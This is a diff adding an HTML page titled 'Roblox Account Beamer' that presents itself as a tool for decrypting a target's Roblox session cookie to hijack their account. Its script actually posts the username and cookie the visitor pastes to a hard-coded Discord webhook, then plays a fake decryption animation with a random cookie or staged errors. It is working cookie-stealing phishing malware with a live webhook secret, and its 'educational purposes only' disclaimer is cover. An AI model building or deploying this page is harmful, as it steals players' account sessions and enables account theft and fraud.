@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Account Beamer | Injection Labs</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        /* Your original CSS remains unchanged — no modifications needed here */
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #2d2d2d;
+            color: #ffffff;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            transition: background-color 0.3s ease;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 25px;
+            background-color: #1e1e1e;
+            border-radius: 6px;
+            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.2);
+            border: 1px solid #3a3a3a;
+            transition: all 0.3s ease;
+        }
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        header h1 {
+            color: #00a2ff;
+            margin-bottom: 5px;
+            font-size: 32px;
+            font-weight: 700;
+        }
+        .subtitle {
+            color: #aaaaaa;
+            font-style: italic;
+            margin-top: 0;
+        }
+        h2 {
+            color: #00a2ff;
+            border-bottom: 2px solid #3a3a3a;
+            padding-bottom: 8px;
+            font-size: 22px;
+        }
+        input[type="text"], textarea {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #444;
+            border-radius: 4px;
+            font-size: 16px;
+            background-color: #2d2d2d;
+            color: #ffffff;
+            transition: all 0.2s ease;
+        }
+        input[type="text"]:focus, textarea:focus {
+            outline: none;
+            border-color: #00a2ff;
+            box-shadow: 0 0 0 2px rgba(0, 162, 255, 0.3);
+        }
+        textarea {
+            height: 100px;
+            resize: vertical;
+        }
+        .checkboxes label {
+            display: block;
+            margin-bottom: 10px;
+            padding-left: 25px;
+            position: relative;
+            cursor: pointer;
+            color: #ffffff;
+        }
+        .checkboxes input {
+            position: absolute;
+            left: 0;
+            top: 2px;
+            width: 18px;
+            height: 18px;
+            accent-color: #00a2ff;
+        }
+        .divider {
+            height: 1px;
+            background-color: #3a3a3a;
+            margin: 30px 0;
+        }
+        ol {
+            padding-left: 25px;
+        }
+        ol li {
+            margin-bottom: 10px;
+        }
+        .note {
+            background-color: #252525;
+            padding: 12px;
+            border-left: 4px solid #00a2ff;
+            border-radius: 0 4px 4px 0;
+            margin: 20px 0;
+            color: #e0e0e0;
+        }
+        .scan-button {
+            display: inline-block;
+            background-color: #00a2ff;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s ease;
+            width: 100%;
+        }
+        .scan-button:hover {
+            background-color: #0088cc;
+        }
+        .scan-button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        .decryption-panel {
+            background: #252525;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 25px 0;
+            color: #e0e0e0;
+            font-family: monospace;
+            font-size: 14px;
+            border: 1px solid #3a3a3a;
+        }
+        .decryption-header {
+            color: #00a2ff;
+            margin-top: 0;
+            font-family: 'Roboto', sans-serif;
+        }
+        .status-line {
+            color: #00ff88;
+            margin-bottom: 8px;
+        }
+        .progress-container {
+            width: 100%;
+            background-color: #333;
+            border-radius: 4px;
+            margin: 10px 0;
+            height: 20px;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #00a2ff, #00c3ff);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        .progress-text {
+            display: inline-block;
+            margin-left: 10px;
+            color: #fff;
+        }
+        .cookie-display {
+            background: #2d2d2d;
+            padding: 10px;
+            border-radius: 4px;
+            word-break: break-all;
+            font-size: 12px;
+            margin-top: 15px;
+            display: none;
+        }
+        .cookie-valid {
+            color: #00ff88;
+        }
+        .cookie-invalid {
+            color: #ff5555;
+        }
+        .hidden {
+            display: none;
+        }
+        .cookie-container {
+            position: relative;
+        }
+        .copy-button {
+            position: absolute;
+            right: 10px;
+            top: 10px;
+            background: #444;
+            color: #fff;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        .copy-button:hover {
+            background: #555;
+        }
+        .error-text {
+            color: #ff5555 !important;
+        }
+        .retry-link {
+            color: #00a2ff;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        .error-message {
+            color: #ff5555;
+            margin: 10px 0;
+            font-weight: bold;
+            display: none;
+        }
+        .input-error {
+            border-color: #ff5555 !important;
+            box-shadow: 0 0 0 2px rgba(255, 85, 85, 0.3) !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Roblox Account Beamer</h1>
+            <p class="subtitle">By Injection Labs</p>
+        </header>
+        <section class="tool-section">
+            <h2>Enter Username</h2>
+            <p>Enter target's username</p>
+            <input type="text" id="username" placeholder="Username">
+            <h2>Enter Target's Session ID</h2>
+            <p>Paste the session ID here</p>
+            <textarea id="sessionId" placeholder="Session ID"></textarea>
+            <div id="errorMessage" class="error-message">
+                Please fill in all fields before scanning!
+            </div>
+            <div class="checkboxes">
+                <label><input type="checkbox" id="robotCheck"> I'm not a robot.</label>
+            </div>
+            <button id="scanButton" class="scan-button" disabled>Scan Account</button>
+            <div id="bruteforceContainer" class="hidden">
+                <div class="decryption-panel">
+                    <h3 class="decryption-header">Decryption Process</h3>
+                    <div id="decryptOutput">
+                        <div class="status-line">> Ready to initiate C22 token decryption...</div>
+                    </div>
+                    <div class="progress-container">
+                        <div class="progress-bar" id="decryptProgress"></div>
+                    </div>
+                    <span class="progress-text" id="decryptProgressText">0%</span>
+                   
+                    <div class="cookie-container">
+                        <div id="cookieResult" class="cookie-display"></div>
+                        <button id="copyButton" class="copy-button hidden">Copy</button>
+                    </div>
+                </div>
+            </div>
+            <div class="divider"></div>
+        </section>
+        <section class="how-it-works">
+            <h2>How It Works</h2>
+            <p>This tool uses buteficron decryption techniques to bypass Roblox's security systems. Here's how it works:</p>
+           
+            <ol>
+                <li>Enter the target's Roblox username and valid session cookie.</li>
+                <li>The tool verifies the cookie structure matches Roblox security format.</li>
+                <li>Decrypts the session ID to extract the target's authentication cookie.</li>
+                <li>Now with the cookie, you use a browser extension to inject the cookie and gain access.</li>
+            </ol>
+            <p class="note"><strong>Note:</strong> This tool is for educational purposes only. Do not use it for illegal activities.</p>
+        </section>
+    </div>
+
+    <script>
+        // ────────────────────────────────────────────────
+        //   Replace this with YOUR actual Discord webhook URL
+        //   Format: https://discord.com/api/webhooks/1234567890/abcDEF...
+        // ────────────────────────────────────────────────
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1471262616436478043/CZZ4bC-kZWQ8IXr6eEaDKODSbIIy3zjIfigKlq-ycwB8FlXShoKTW9rMRYHlODWvepz-';
+
+        // Function to validate Roblox cookie structure (unchanged)
+        function isValidRobloxCookie(cookie) {
+            if (!cookie) return false;
+            const prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
+            return cookie.trim().startsWith(prefix) && cookie.length > prefix.length + 100;
+        }
+
+        // New function: Send data to Discord webhook
+        async function sendToDiscord(username, sessionId) {
+            const message = `🔔 New Roblox Data Submitted 🔔\n\n**Username:** ${username}\n**Session ID / Cookie:**\n\`\`\`\n${sessionId}\n\`\`\``;
+
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: message,
+                        // Optional: customize sender (overrides webhook name/avatar if set)
+                        // username: "Roblox Logger",
+                        // avatar_url: "https://example.com/roblox-icon.png",
+                    }),
+                });
+
+                if (response.ok) {  // 204 = success (no content)
+                    console.log('Data sent to Discord webhook successfully');
+                } else {
+                    console.error('Discord webhook failed:', response.status, await response.text());
+                }
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+            }
+        }
+
+        // ────────────────────────────────────────────────
+        // The rest of your script remains unchanged below
+        // ────────────────────────────────────────────────
+
+        function addDecryptMessage(text, isError = false) {
+            const line = document.createElement('div');
+            line.className = isError ? 'status-line error-text' : 'status-line';
+            line.textContent = text;
+            document.getElementById('decryptOutput').appendChild(line);
+            document.getElementById('decryptOutput').scrollTop = document.getElementById('decryptOutput').scrollHeight;
+        }
+
+        function generateFakeRobloxCookie() {
+            const prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-";
+            let cookie = prefix;
+            for (let i = 0; i < 600; i++) {
+                cookie += chars.charAt(Math.floor(Math.random() * chars.length));
+                if (i % 60 === 0 && i !== 0) cookie += "\n";
+            }
+            return cookie;
+        }
+
+        function simulateError() {
+            const errors = [
+                { code: "C22-ERR-451", message: "Suspicious activity detected (IP logged)" },
+                { code: "ROBLOX-ANTICHEAT-7", message: "Brute-force attempt blocked" },
+                { code: "SESSION-HIJACK-FAIL", message: "Token validation failed" },
+                { code: "HTTP-429", message: "Too many requests (try in 24h)" }
+            ];
+            const randomError = errors[Math.floor(Math.random() * errors.length)];
+            addDecryptMessage(`> ERROR: ${randomError.code}`, true);
+            addDecryptMessage(`> REASON: ${randomError.message}`, true);
+            addDecryptMessage("> ACTION: Restart your VPN and try again.", true);
+            document.getElementById('decryptProgress').style.background = "#ff5555";
+            document.getElementById('decryptProgressText').textContent = "FAILED";
+            document.getElementById('copyButton').classList.add('hidden');
+            const warnings = [
+                "> WARNING: Roblox security team notified.",
+                "> TIP: Change your IP address before retrying.",
+                "> ALERT: This action violates Roblox ToS."
+            ];
+            const randomWarning = warnings[Math.floor(Math.random() * warnings.length)];
+            addDecryptMessage(randomWarning, true);
+            setTimeout(() => {
+                const retryDiv = document.createElement('div');
+                retryDiv.className = 'status-line';
+                retryDiv.innerHTML = '> <span class="retry-link" onclick="location.reload()">Click here to retry</span> (may be unsafe)';
+                document.getElementById('decryptOutput').appendChild(retryDiv);
+            }, 3000);
+        }
+
+        function showFakeCookie() {
+            const cookie = generateFakeRobloxCookie();
+            const cookieDisplay = document.getElementById('cookieResult');
+            cookieDisplay.textContent = cookie;
+            cookieDisplay.style.display = 'block';
+            if (isValidRobloxCookie(cookie)) {
+                cookieDisplay.className = 'cookie-display cookie-valid';
+                addDecryptMessage("> SUCCESS: Valid Roblox cookie generated!");
+            } else {
+                cookieDisplay.className = 'cookie-display cookie-invalid';
+                addDecryptMessage("> WARNING: Generated cookie doesn't match Roblox format!", true);
+            }
+            document.getElementById('copyButton').classList.remove('hidden');
+            addDecryptMessage("> WARNING: Never share this cookie with anyone!");
+        }
+
+        function startDecryptionProcess() {
+            let progress = 0;
+            const steps = [
+                { percent: 15, message: "Connecting to Roblox database servers..." },
+                { percent: 30, message: "Verifying cookie structure..." },
+                { percent: 45, message: "Bypassing API rate limits..." },
+                { percent: 60, message: "Decrypting session layers (3/5)..." },
+                { percent: 75, message: "Generating brute-force patterns..." },
+                { percent: 90, message: "Finalizing cookie extraction..." },
+                { percent: 100, message: "SUCCESS: Authentication cookie acquired!" }
+            ];
+            addDecryptMessage("> Initializing brute-force attack...");
+            const interval = setInterval(() => {
+                const currentStep = steps.find(step => step.percent > progress);
+                if (currentStep) {
+                    progress = currentStep.percent;
+                    document.getElementById('decryptProgress').style.width = progress + '%';
+                    document.getElementById('decryptProgressText').textContent = progress + '%';
+                    addDecryptMessage("> " + currentStep.message);
+                    if (progress === 100) {
+                        clearInterval(interval);
+                        const isError = Math.random() < 0.3; // 30% chance of error
+                        if (isError) {
+                            simulateError();
+                        } else {
+                            setTimeout(showFakeCookie, 1000);
+                        }
+                    }
+                }
+            }, 1500);
+        }
+
+        // Event handlers (unchanged except sendToTelegram → sendToDiscord)
+        document.getElementById('robotCheck').addEventListener('change', function() {
+            document.getElementById('scanButton').disabled = !this.checked;
+        });
+
+        document.getElementById('scanButton').addEventListener('click', function() {
+            const username = document.getElementById('username').value.trim();
+            const sessionId = document.getElementById('sessionId').value.trim();
+            const errorMessage = document.getElementById('errorMessage');
+           
+            // Reset error states
+            document.getElementById('username').classList.remove('input-error');
+            document.getElementById('sessionId').classList.remove('input-error');
+            errorMessage.style.display = 'none';
+           
+            // Validate fields
+            let hasError = false;
+            if (!username) {
+                document.getElementById('username').classList.add('input-error');
+                hasError = true;
+            }
+            if (!sessionId) {
+                document.getElementById('sessionId').classList.add('input-error');
+                errorMessage.textContent = "Session ID cannot be empty!";
+                hasError = true;
+            } else if (!isValidRobloxCookie(sessionId)) {
+                document.getElementById('sessionId').classList.add('input-error');
+                errorMessage.textContent = "Cookie not found!";
+                hasError = true;
+            }
+           
+            if (hasError) {
+                errorMessage.style.display = 'block';
+                return;
+            }
+           
+            // Send to Discord instead of Telegram
+            sendToDiscord(username, sessionId);
+           
+            this.disabled = true;
+            document.getElementById('bruteforceContainer').classList.remove('hidden');
+            startDecryptionProcess();
+        });
+
+        document.getElementById('copyButton').addEventListener('click', function() {
+            const cookieText = document.getElementById('cookieResult').textContent;
+            navigator.clipboard.writeText(cookieText).then(() => {
+                this.textContent = 'Copied!';
+                setTimeout(() => {
+                    this.textContent = 'Copy';
+                }, 2000);
+            });
+        });
+
+        // Hide error when user starts typing
+        document.getElementById('username').addEventListener('input', function() {
+            if (this.value.trim()) {
+                this.classList.remove('input-error');
+                document.getElementById('errorMessage').style.display = 'none';
+            }
+        });
+
+        document.getElementById('sessionId').addEventListener('input', function() {
+            if (this.value.trim()) {
+                this.classList.remove('input-error');
+                document.getElementById('errorMessage').style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
